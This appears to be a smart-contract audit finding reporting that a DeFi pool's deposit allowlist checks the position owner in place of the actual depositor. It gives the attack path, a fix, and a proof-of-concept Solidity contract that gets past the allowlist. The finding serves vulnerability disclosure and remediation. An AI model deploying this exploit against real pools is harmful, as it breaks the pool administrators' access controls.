### Title
`DepositAllowlistExtension` Checks `owner` Instead of `sender`, Allowing Any Unprivileged Address to Bypass the Deposit Guard — (`metric-periphery/contracts/extensions/DepositAllowlistExtension.sol`)

---

### Summary

The `DepositAllowlistExtension.beforeAddLiquidity` hook validates the LP position `owner` (a caller-supplied parameter) against the allowlist instead of the actual depositor `sender` (`msg.sender` of the pool call). Because `addLiquidity` imposes no constraint that `msg.sender == owner`, any unprivileged address can bypass the deposit allowlist by nominating an allowlisted address as `owner`, paying the tokens via the callback, and crediting the position to that allowlisted address.

---

### Finding Description

**Root cause — wrong address checked in the guard:**

`DepositAllowlistExtension.beforeAddLiquidity` silently discards the `sender` argument and gates on `owner`: [1](#0-0) 

```solidity
function beforeAddLiquidity(address, address owner, uint80, LiquidityDelta calldata, bytes calldata)
    external view override returns (bytes4)
{
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][owner]) {
        revert IMetricOmmPoolActions.NotAllowedToDeposit();
    }
    return IMetricOmmExtensions.beforeAddLiquidity.selector;
}
```

The first parameter (`sender`) is unnamed and ignored. The check is `allowedDepositor[pool][owner]`.

**`addLiquidity` accepts a free-form `owner` with no `msg.sender == owner` constraint:** [2](#0-1) 

```solidity
function addLiquidity(
    address owner,          // ← caller-supplied, no restriction
    uint80 salt,
    LiquidityDelta calldata deltas,
    bytes calldata callbackData,
    bytes calldata extensionData
) external nonReentrant(PoolActions.ADD_LIQUIDITY) returns (...) {
    ...
    _beforeAddLiquidity(msg.sender, owner, salt, deltas, extensionData);
    (amount0Added, amount1Added) = LiquidityLib.addLiquidity(
        _liquidityContext(), owner, salt, deltas, callbackData, ...
    );
```

`removeLiquidity` enforces `msg.sender == owner`, but `addLiquidity` does not: [3](#0-2) 

**Contrast with `SwapAllowlistExtension`, which correctly checks `sender`:** [4](#0-3) 

```solidity
function beforeSwap(address sender, address, ...) external view override returns (bytes4) {
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
        revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
```

The swap guard checks `sender` (the actual initiator). The deposit guard checks `owner` (the position recipient). This asymmetry is the bug.

**Attack path:**

1. Pool admin deploys pool with `DepositAllowlistExtension`; allowlists Alice, not Bob.
2. Bob calls `pool.addLiquidity(alice, salt, deltas, callbackData, extensionData)`.
3. Pool calls `_beforeAddLiquidity(bob /*sender*/, alice /*owner*/, ...)`.
4. Extension checks `allowedDepositor[pool][alice]` → `true` → guard passes.
5. `LiquidityLib.addLiquidity` credits the position to `alice`.
6. The modify-liquidity callback fires to `bob` (the `msg.sender`), pulling Bob's tokens into the pool.
7. Bob has deposited into a restricted pool; Alice receives an LP position she did not request.

Bob can also use any other allowlisted address (e.g., a known LP, the pool admin themselves) as `owner`. The allowlist is fully bypassed for the actual depositing party.

---

### Impact Explanation

The deposit allowlist is the primary access-control mechanism for restricting who may provide liquidity to a pool. Bypassing it allows any unprivileged address to inject liquidity into a pool that the admin intended to be permissioned. Consequences include:

- **Broken core pool functionality**: The allowlist guard is rendered ineffective; the pool admin cannot enforce depositor restrictions.
- **Unauthorized LP positions**: Allowlisted addresses receive positions they did not initiate, potentially complicating their accounting or regulatory posture.
- **Attacker token loss is not a mitigant**: The attacker loses tokens to the allowlisted owner's position, but the pool invariant that "only approved depositors add liquidity" is broken regardless.

---

### Likelihood Explanation

Exploitation requires no special privilege, no flash loan, and no oracle manipulation. Any externally-owned account can call `addLiquidity` with an arbitrary `owner`. The only prerequisite is knowing one allowlisted address (trivially discoverable from on-chain events emitted by `setAllowedToDeposit`).

---

### Recommendation

Change `beforeAddLiquidity` to validate `sender` (the actual depositor) instead of `owner` (the position recipient), mirroring the pattern used in `SwapAllowlistExtension`:

```solidity
// metric-periphery/contracts/extensions/DepositAllowlistExtension.sol
function beforeAddLiquidity(address sender, address, uint80, LiquidityDelta calldata, bytes calldata)
    external view override returns (bytes4)
{
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][sender]) {
        revert IMetricOmmPoolActions.NotAllowedToDeposit();
    }
    return IMetricOmmExtensions.beforeAddLiquidity.selector;
}
``` [1](#0-0) 

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

// Setup: pool with DepositAllowlistExtension
// Alice is allowlisted; Bob is not.

contract BypassDeposit is IMetricOmmModifyLiquidityCallback {
    IMetricOmmPoolActions pool;
    IERC20 token0;
    IERC20 token1;

    constructor(address pool_, address t0, address t1) {
        pool = IMetricOmmPoolActions(pool_);
        token0 = IERC20(t0);
        token1 = IERC20(t1);
    }

    function exploit(address alice, uint80 salt, LiquidityDelta calldata deltas) external {
        // Bob (this contract) calls addLiquidity with alice as owner.
        // Extension checks allowedDepositor[pool][alice] → true → passes.
        // Callback fires to this contract (Bob), pulling Bob's tokens.
        pool.addLiquidity(alice, salt, deltas, "", "");
    }

    function metricOmmModifyLiquidityCallback(uint256 a0, uint256 a1, bytes calldata) external override {
        if (a0 > 0) token0.transfer(msg.sender, a0);
        if (a1 > 0) token1.transfer(msg.sender, a1);
    }
}
```

After `exploit` executes:
- `pool.getPositionBinShares(alice, salt, binIdx)` > 0 (Alice has a position she never created).
- Bob's token balance is reduced by the deposited amounts.
- The deposit allowlist has been bypassed by an address that was never approved.

### Citations

**File:** metric-periphery/contracts/extensions/DepositAllowlistExtension.sol (L32-42)
```text
  function beforeAddLiquidity(address, address owner, uint80, LiquidityDelta calldata, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][owner]) {
      revert IMetricOmmPoolActions.NotAllowedToDeposit();
    }
    return IMetricOmmExtensions.beforeAddLiquidity.selector;
  }
```

**File:** metric-core/contracts/MetricOmmPool.sol (L182-196)
```text
  function addLiquidity(
    address owner,
    uint80 salt,
    LiquidityDelta calldata deltas,
    bytes calldata callbackData,
    bytes calldata extensionData
  ) external nonReentrant(PoolActions.ADD_LIQUIDITY) returns (uint256 amount0Added, uint256 amount1Added) {
    if (deltas.binIdxs.length == 0) return (0, 0);
    if (deltas.binIdxs.length != deltas.shares.length) revert LiquidityDeltaLengthMismatch();
    _beforeAddLiquidity(msg.sender, owner, salt, deltas, extensionData);
    (amount0Added, amount1Added) = LiquidityLib.addLiquidity(
      _liquidityContext(), owner, salt, deltas, callbackData, binTotals, _binStates, _binTotalShares, _positionBinShares
    );
    _afterAddLiquidity(msg.sender, owner, salt, deltas, amount0Added, amount1Added, extensionData);
  }
```

**File:** metric-core/contracts/MetricOmmPool.sol (L199-212)
```text
  function removeLiquidity(address owner, uint80 salt, LiquidityDelta calldata deltas, bytes calldata extensionData)
    external
    nonReentrant(PoolActions.REMOVE_LIQUIDITY)
    returns (uint256 amount0Removed, uint256 amount1Removed)
  {
    if (deltas.binIdxs.length == 0) return (0, 0);
    if (deltas.binIdxs.length != deltas.shares.length) revert LiquidityDeltaLengthMismatch();
    if (msg.sender != owner) revert NotPositionOwner();
    _beforeRemoveLiquidity(msg.sender, owner, salt, deltas, extensionData);
    (amount0Removed, amount1Removed) = LiquidityLib.removeLiquidity(
      _liquidityContext(), owner, salt, deltas, binTotals, _binStates, _binTotalShares, _positionBinShares
    );
    _afterRemoveLiquidity(msg.sender, owner, salt, deltas, amount0Removed, amount1Removed, extensionData);
  }
```

**File:** metric-periphery/contracts/extensions/SwapAllowlistExtension.sol (L31-41)
```text
  function beforeSwap(address sender, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
      revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    return IMetricOmmExtensions.beforeSwap.selector;
  }
```
